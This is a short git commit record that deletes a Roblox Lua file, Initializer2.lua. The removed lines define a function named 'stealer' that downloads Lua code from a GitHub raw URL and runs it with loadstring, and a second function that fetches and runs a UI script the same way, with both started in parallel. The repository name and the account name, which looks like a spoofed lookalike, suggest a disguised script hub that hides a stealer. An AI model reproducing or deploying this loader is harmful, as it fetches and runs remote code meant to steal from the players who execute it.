be854191196bb5e65e08b9692b50a273bb073c5c
hoodratleahh <voltdaizakazatb@gmail.com>
2025-07-29 03:20:12 +0500

    Delete Initializer2.lua

--- Initializer2.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratIeahh/Summer-UPD/refs/heads/main/Initializer.lua"))()
-    end
-    local function loadui()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratIeahh/Summer-UPD/refs/heads/main/1"))()
-        end
-
-        task.spawn(stealer)
-        task.spawn(loadui)
